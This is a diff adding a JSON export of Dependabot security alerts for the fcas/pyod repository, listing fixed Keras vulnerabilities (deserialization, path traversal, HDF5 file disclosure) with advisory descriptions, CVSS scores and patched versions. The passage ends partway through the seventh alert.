@@ -1,0 +1,1499 @@
+[
+    {
+        "number": 14,
+        "state": "fixed",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "keras"
+            },
+            "manifest_path": "docs/requirements.txt",
+            "scope": "runtime",
+            "relationship": "unknown"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-m8wh-29wm-52mv",
+            "cve_id": "CVE-2026-9335",
+            "summary": "Keras: HDF5 links can disclose local file contents",
+            "description": "A vulnerability in keras-team/keras versions <= 3.14.0 allows arbitrary local HDF5 file content disclosure due to improper handling of HDF5 ExternalLinks. The `KerasFileEditor` and `keras.saving.load_weights` functions bypass the `safe_get_h5_group` and `safe_get_h5_dataset` helpers, which are designed to reject ExternalLinks and SoftLinks. This results in automatic dereferencing of links to external HDF5 files, enabling attackers to disclose sensitive data from the victim's local filesystem. Specifically, `KerasFileEditor` extracts attributes and datasets from linked files into its internal structures, while `keras.saving.load_weights` loads weights from linked files into the user's model. This issue can be exploited by providing a malicious `.h5`, `.weights.h5`, or `.keras` file containing ExternalLinks.",
+            "severity": "medium",
+            "identifiers": [
+                {
+                    "value": "GHSA-m8wh-29wm-52mv",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2026-9335",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-9335"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/commit/23370f16b0ab9a200f7550a34e54a3ceab74ba0e"
+                },
+                {
+                    "url": "https://huntr.com/bounties/876a7226-5428-4a66-9d05-232461120db5"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/pull/22899"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/pull/23165"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/commit/d338a45204bdc787c8b3c4a9b82c1911cd52dedf"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/releases/tag/v3.12.3"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/releases/tag/v3.15.0"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-m8wh-29wm-52mv"
+                }
+            ],
+            "published_at": "2026-08-02T06:30:20Z",
+            "updated_at": "2026-08-07T20:35:49Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "keras"
+                    },
+                    "severity": "medium",
+                    "vulnerable_version_range": "< 3.12.3",
+                    "first_patched_version": {
+                        "identifier": "3.12.3"
+                    }
+                },
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "keras"
+                    },
+                    "severity": "medium",
+                    "vulnerable_version_range": ">= 3.13.0, < 3.15.0",
+                    "first_patched_version": {
+                        "identifier": "3.15.0"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
+                    "score": 6.5
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "epss": {
+                "percentage": 0.00646,
+                "percentile": 0.47552
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
+                "score": 6.5
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-22",
+                    "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "keras"
+            },
+            "severity": "medium",
+            "vulnerable_version_range": "< 3.12.3",
+            "first_patched_version": {
+                "identifier": "3.12.3"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/pyod/dependabot/alerts/14",
+        "html_url": "https://github.com/fcas/pyod/security/dependabot/14",
+        "created_at": "2026-08-09T12:05:04Z",
+        "updated_at": "2026-08-14T16:09:58Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": "2026-08-14T16:09:58Z",
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 13,
+        "state": "fixed",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "keras"
+            },
+            "manifest_path": "docs/requirements.txt",
+            "scope": "runtime",
+            "relationship": "unknown"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-v2w2-w228-c444",
+            "cve_id": "CVE-2026-12484",
+            "summary": "Keras: TorchModuleWrapper can deserialize unsafe PyTorch pickle data",
+            "description": "A vulnerability in keras-team/keras version 3.15.0 allows unsafe deserialization of attacker-controlled PyTorch pickle data through the public `keras.layers.TorchModuleWrapper.from_config` method. This method invokes `torch.load(..., weights_only=False)` without requiring an explicit unsafe opt-in, such as a `safe_mode=False` parameter. When called outside a `SafeModeScope(True)` context, the absence of an ambient safe mode state permits unsafe deserialization by default. This issue can lead to arbitrary code execution if untrusted Keras layer configurations are processed using this method. The vulnerability arises because the method does not enforce safe deserialization practices unless explicitly guarded by Keras safe mode.",
+            "severity": "high",
+            "identifiers": [
+                {
+                    "value": "GHSA-v2w2-w228-c444",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2026-12484",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-12484"
+                },
+                {
+                    "url": "https://huntr.com/bounties/ab14df49-13b5-4442-b754-3189430bfa28"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/pull/23048"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/pull/23165"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/commit/55888d3becbdbb45dc16a55b489900f911e2dde5"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/commit/d338a45204bdc787c8b3c4a9b82c1911cd52dedf"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/releases/tag/v3.12.3"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/releases/tag/v3.15.0"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-v2w2-w228-c444"
+                }
+            ],
+            "published_at": "2026-07-19T21:30:20Z",
+            "updated_at": "2026-08-07T20:33:50Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "keras"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": "< 3.12.3",
+                    "first_patched_version": {
+                        "identifier": "3.12.3"
+                    }
+                },
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "keras"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": ">= 3.13.0, < 3.15.0",
+                    "first_patched_version": {
+                        "identifier": "3.15.0"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.0/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+                    "score": 7.8
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "epss": {
+                "percentage": 0.00204,
+                "percentile": 0.10532
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.0/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+                "score": 7.8
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-502",
+                    "name": "Deserialization of Untrusted Data"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "keras"
+            },
+            "severity": "high",
+            "vulnerable_version_range": "< 3.12.3",
+            "first_patched_version": {
+                "identifier": "3.12.3"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/pyod/dependabot/alerts/13",
+        "html_url": "https://github.com/fcas/pyod/security/dependabot/13",
+        "created_at": "2026-08-09T11:58:53Z",
+        "updated_at": "2026-08-14T16:09:57Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": "2026-08-14T16:09:57Z",
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 12,
+        "state": "fixed",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "keras"
+            },
+            "manifest_path": "docs/requirements.txt",
+            "scope": "runtime",
+            "relationship": "unknown"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-58hv-7753-xmfq",
+            "cve_id": "CVE-2026-12482",
+            "summary": "Keras: tar extraction permits symlink-based path traversal",
+            "description": "A vulnerability in keras-team/keras version 3.12.0 allows an attacker to craft a malicious tar archive that bypasses the `filter_safe_tarinfos` validation in `keras/src/utils/file_utils.py`. Specifically, symlink entries are not subjected to the same `is_path_in_dir` validation as regular file entries, allowing symlinks to be created outside the intended extraction directory. This can lead to symlink-based file read, file overwrite, or directory escape attacks. The issue is particularly impactful on Python 3.10 and 3.11, where `filter_safe_tarinfos` is the sole defense against tar path traversal. This vulnerability is distinct from CVE-2025-12060 and other previously reported issues.",
+            "severity": "low",
+            "identifiers": [
+                {
+                    "value": "GHSA-58hv-7753-xmfq",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2026-12482",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-12482"
+                },
+                {
+                    "url": "https://huntr.com/bounties/5d3638e8-a9f6-4964-a865-ddb9fe4d4b6e"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/pull/23015"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/pull/23165"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/commit/9867df45c456dd1077a6243bb56219f66e288150"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/commit/d338a45204bdc787c8b3c4a9b82c1911cd52dedf"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/releases/tag/v3.12.3"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/releases/tag/v3.15.0"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-58hv-7753-xmfq"
+                }
+            ],
+            "published_at": "2026-07-14T06:31:23Z",
+            "updated_at": "2026-08-07T20:32:13Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "keras"
+                    },
+                    "severity": "low",
+                    "vulnerable_version_range": "< 3.12.3",
+                    "first_patched_version": {
+                        "identifier": "3.12.3"
+                    }
+                },
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "keras"
+                    },
+                    "severity": "low",
+                    "vulnerable_version_range": ">= 3.13.0, < 3.15.0",
+                    "first_patched_version": {
+                        "identifier": "3.15.0"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N",
+                    "score": 3.1
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "epss": {
+                "percentage": 0.00238,
+                "percentile": 0.14847
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N",
+                "score": 3.1
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-22",
+                    "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "keras"
+            },
+            "severity": "low",
+            "vulnerable_version_range": "< 3.12.3",
+            "first_patched_version": {
+                "identifier": "3.12.3"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/pyod/dependabot/alerts/12",
+        "html_url": "https://github.com/fcas/pyod/security/dependabot/12",
+        "created_at": "2026-08-09T11:54:27Z",
+        "updated_at": "2026-08-14T16:09:57Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": "2026-08-14T16:09:57Z",
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 11,
+        "state": "fixed",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "keras"
+            },
+            "manifest_path": "docs/requirements.txt",
+            "scope": "runtime",
+            "relationship": "unknown"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-5gwj-m78q-7pq3",
+            "cve_id": "CVE-2026-12481",
+            "summary": "Keras: Lambda deserialization can bypass safe mode and execute code",
+            "description": "A vulnerability in keras-team/keras version 3.14.0 allows for arbitrary code execution due to improper handling of deserialization in the `Lambda` layer. Specifically, the `_raise_for_lambda_deserialization()` function fails to enforce the safe-mode guard when `safe_mode` is set to `None`, which is the default value when `from_config()` is called outside of a `SafeModeScope` context. This logic error conflates `None` (unset/default-deny) with `False` (explicitly disabled), bypassing the guard and allowing attacker-controlled `marshal` bytecode to be deserialized. Affected call sites include `keras.layers.deserialize(config)`, `keras.models.clone_model(model)`, and any direct invocation of `Lambda.from_config(config)` without an enclosing `SafeModeScope(True)`. This vulnerability can be exploited to achieve arbitrary OS-level code execution in the context of the server or user process.",
+            "severity": "high",
+            "identifiers": [
+                {
+                    "value": "GHSA-5gwj-m78q-7pq3",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2026-12481",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-12481"
+                },
+                {
+                    "url": "https://huntr.com/bounties/59ceaed1-c8a3-4135-8f94-169ade02823d"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/pull/23048"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/pull/23165"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/commit/55888d3becbdbb45dc16a55b489900f911e2dde5"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/commit/d338a45204bdc787c8b3c4a9b82c1911cd52dedf"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/releases/tag/v3.12.3"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/releases/tag/v3.15.0"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-5gwj-m78q-7pq3"
+                }
+            ],
+            "published_at": "2026-07-03T21:31:36Z",
+            "updated_at": "2026-08-07T20:30:43Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "keras"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": "< 3.12.3",
+                    "first_patched_version": {
+                        "identifier": "3.12.3"
+                    }
+                },
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "keras"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": ">= 3.13.0, < 3.15.0",
+                    "first_patched_version": {
+                        "identifier": "3.15.0"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+                    "score": 8.8
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "epss": {
+                "percentage": 0.00467,
+                "percentile": 0.37849
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+                "score": 8.8
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-502",
+                    "name": "Deserialization of Untrusted Data"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "keras"
+            },
+            "severity": "high",
+            "vulnerable_version_range": "< 3.12.3",
+            "first_patched_version": {
+                "identifier": "3.12.3"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/pyod/dependabot/alerts/11",
+        "html_url": "https://github.com/fcas/pyod/security/dependabot/11",
+        "created_at": "2026-08-09T11:50:35Z",
+        "updated_at": "2026-08-14T16:09:57Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": "2026-08-14T16:09:57Z",
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 10,
+        "state": "fixed",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "keras"
+            },
+            "manifest_path": "docs/requirements.txt",
+            "scope": "runtime",
+            "relationship": "unknown"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-26c4-7vv6-867j",
+            "cve_id": "CVE-2026-12480",
+            "summary": "Keras: HDF5 virtual datasets can disclose local files",
+            "description": "Keras versions up to and including 3.13.2 are vulnerable to an arbitrary HDF5 file read due to an incomplete fix for CVE-2026-1669. The vulnerability resides in the `H5IOStore._verify_dataset()` and `file_editor.py` methods, which fail to check the `dataset.is_virtual` property of HDF5 datasets. This allows an attacker to craft a malicious `.keras` model archive or `.h5` weights file containing a Virtual Dataset (VDS) that references external HDF5 files on the victim's filesystem. When the victim loads the model using `keras.models.load_model()` or `keras.saving.load_model()`, the external file is transparently read, leading to potential information disclosure. Fixed in versions 3.12.3 and 3.15.0.",
+            "severity": "medium",
+            "identifiers": [
+                {
+                    "value": "GHSA-26c4-7vv6-867j",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2026-12480",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-12480"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/commit/d5a88bdb137c0d3039b8f4bbbe8c7099925cc10c"
+                },
+                {
+                    "url": "https://huntr.com/bounties/1875d257-5b03-4a69-ac70-e98653fa12c7"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/commit/8f987f11bf7512f0df4774a8f1557bba07dc2b49"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/releases/tag/v3.12.3"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/releases/tag/v3.15.0"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-26c4-7vv6-867j"
+                }
+            ],
+            "published_at": "2026-07-01T18:31:51Z",
+            "updated_at": "2026-08-07T20:28:59Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "keras"
+                    },
+                    "severity": "medium",
+                    "vulnerable_version_range": "< 3.12.3",
+                    "first_patched_version": {
+                        "identifier": "3.12.3"
+                    }
+                },
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "keras"
+                    },
+                    "severity": "medium",
+                    "vulnerable_version_range": ">= 3.13.0, < 3.15.0",
+                    "first_patched_version": {
+                        "identifier": "3.15.0"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.0/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
+                    "score": 5.5
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "epss": {
+                "percentage": 0.00127,
+                "percentile": 0.0274
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.0/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
+                "score": 5.5
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-73",
+                    "name": "External Control of File Name or Path"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "keras"
+            },
+            "severity": "medium",
+            "vulnerable_version_range": "< 3.12.3",
+            "first_patched_version": {
+                "identifier": "3.12.3"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/pyod/dependabot/alerts/10",
+        "html_url": "https://github.com/fcas/pyod/security/dependabot/10",
+        "created_at": "2026-08-09T11:46:35Z",
+        "updated_at": "2026-08-14T16:09:57Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": "2026-08-14T16:09:57Z",
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 9,
+        "state": "fixed",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "keras"
+            },
+            "manifest_path": "docs/requirements.txt",
+            "scope": "runtime",
+            "relationship": "unknown"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-gh82-f9x8-5frx",
+            "cve_id": "CVE-2026-12479",
+            "summary": "Keras: DiskIOStore permits path traversal through crafted layer names",
+            "description": "A path traversal vulnerability exists in keras-team/keras version 3.14.0, specifically in the `DiskIOStore.make` method within the Keras 3 model saving and loading library. This vulnerability arises from the improper handling of user-provided layer names, which are used to construct directory paths without sanitizing for parent directory components (`..`). While forward slashes (`/`) are restricted in layer names, directory traversal sequences are not. This allows an attacker to craft a malicious Keras model that, when saved or loaded, can escape the intended temporary working directory and perform unauthorized file system operations, such as creating directories or writing files in arbitrary locations.",
+            "severity": "medium",
+            "identifiers": [
+                {
+                    "value": "GHSA-gh82-f9x8-5frx",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2026-12479",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-12479"
+                },
+                {
+                    "url": "https://huntr.com/bounties/188836b9-12fc-49c7-8dbf-04f60fe33743"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/pull/23017"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/commit/d8caeb58cc9e61ea092445dc7a20908ca8d693e2"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/releases/tag/v3.12.3"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/releases/tag/v3.15.0"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-gh82-f9x8-5frx"
+                }
+            ],
+            "published_at": "2026-06-22T18:34:13Z",
+            "updated_at": "2026-08-07T20:13:30Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "keras"
+                    },
+                    "severity": "medium",
+                    "vulnerable_version_range": "< 3.12.3",
+                    "first_patched_version": {
+                        "identifier": "3.12.3"
+                    }
+                },
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "keras"
+                    },
+                    "severity": "medium",
+                    "vulnerable_version_range": ">= 3.13.0, < 3.15.0",
+                    "first_patched_version": {
+                        "identifier": "3.15.0"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.0/AV:L/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L",
+                    "score": 6.1
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "epss": {
+                "percentage": 0.00384,
+                "percentile": 0.30931
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.0/AV:L/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L",
+                "score": 6.1
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-22",
+                    "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "keras"
+            },
+            "severity": "medium",
+            "vulnerable_version_range": "< 3.12.3",
+            "first_patched_version": {
+                "identifier": "3.12.3"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/pyod/dependabot/alerts/9",
+        "html_url": "https://github.com/fcas/pyod/security/dependabot/9",
+        "created_at": "2026-08-09T11:13:35Z",
+        "updated_at": "2026-08-14T16:09:57Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": "2026-08-14T16:09:57Z",
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 8,
+        "state": "fixed",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "keras"
+            },
+            "manifest_path": "docs/requirements.txt",
+            "scope": "runtime",
+            "relationship": "unknown"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-hqp4-2352-xf5r",
+            "cve_id": "CVE-2026-11816",
+            "summary": "Keras archive extraction utilities allow path traversal and arbitrary file writes",
+            "description": "Keras versions prior to 3.14.0 are vulnerable to a path traversal issue in the archive extraction utilities located in `keras/src/utils/file_utils.py`. The functions `filter_safe_tarinfos()` and `filter_safe_zipinfos()` validate archive member paths against the process current working directory (CWD) instead of the actual extraction destination. When the process runs with CWD set to `/`, which is common in Docker containers, CI/CD runners, and Jupyter environments, the validation boundary becomes the filesystem root, allowing traversal paths to bypass the security check. Additionally, the zip filter contains a bug that causes an `AttributeError` when a blocked entry is encountered, leading to incomplete extraction. Furthermore, Python 3.11 installations lack the `filter=\"data\"` safety net, leaving them entirely reliant on the flawed CWD-based filter. Exploitation of this vulnerability can result in arbitrary file writes outside the intended extraction directory, enabling attackers to overwrite configuration files, inject malicious code, or corrupt machine learning datasets and pipelines.",
+            "severity": "high",
+            "identifiers": [
+                {
+                    "value": "GHSA-hqp4-2352-xf5r",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2026-11816",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-11816"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/commit/2465b6657b02c8eed308759b7e800e295ae01888"
+                },
+                {
+                    "url": "https://huntr.com/bounties/a07e3983-7158-4419-af2b-38f1dea01a4f"
+                },
+                {
+                    "url": "https://access.redhat.com/security/cve/CVE-2026-11816"
+                },
+                {
+                    "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2487912"
+                },
+                {
+                    "url": "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-11816.json"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/pull/22194"
+                },
+                {
+                    "url": "https://access.redhat.com/errata/RHSA-2026:42644"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/releases/tag/v3.14.0"
+                },
+                {
+                    "url": "https://github.com/pypa/advisory-database/tree/main/vulns/keras/PYSEC-2026-2324.yaml"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-hqp4-2352-xf5r"
+                }
+            ],
+            "published_at": "2026-06-11T15:31:33Z",
+            "updated_at": "2026-08-07T20:09:26Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "keras"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": "< 3.14.0",
+                    "first_patched_version": {
+                        "identifier": "3.14.0"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
+                    "score": 8.1
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "epss": {
+                "percentage": 0.00563,
+                "percentile": 0.43509
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
+                "score": 8.1
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-22",
+                    "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "keras"
+            },
+            "severity": "high",
+            "vulnerable_version_range": "< 3.14.0",
+            "first_patched_version": {
+                "identifier": "3.14.0"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/pyod/dependabot/alerts/8",
+        "html_url": "https://github.com/fcas/pyod/security/dependabot/8",
+        "created_at": "2026-08-09T11:03:59Z",
+        "updated_at": "2026-08-14T16:09:57Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": "2026-08-14T16:09:57Z",
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 7,
+        "state": "fixed",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "keras"
+            },
+            "manifest_path": "docs/requirements.txt",
+            "scope": "runtime",
+            "relationship": "unknown"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-4f3f-g24h-fr8m",
+            "cve_id": "CVE-2026-1462",
+            "summary": "Keras has an untrusted deserialization vulnerability",
+            "description": "A vulnerability in the `TFSMLayer` class of the `keras` package, version 3.13.0, allows attacker-controlled TensorFlow SavedModels to be loaded during deserialization of `.keras` models, even when `safe_mode=True`. This bypasses the security guarantees of `safe_mode` and enables arbitrary attacker-controlled code execution during model inference under the victim's privileges. The issue arises due to the unconditional loading of external SavedModels, serialization of attacker-controlled file paths, and the lack of validation in the `from_config()` method.",
+            "severity": "high",
+            "identifiers": [
+                {
+                    "value": "GHSA-4f3f-g24h-fr8m",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2026-1462",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-1462"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/commit/b6773d3decaef1b05d8e794458e148cb362f163f"
+                },
+                {
+                    "url": "https://huntr.com/bounties/7e78d6f1-6977-4300-b595-e81bdbda331c"
+                },
+                {
+                    "url": "https://github.com/keras-team/keras/pull/22035"
+                },
+                {
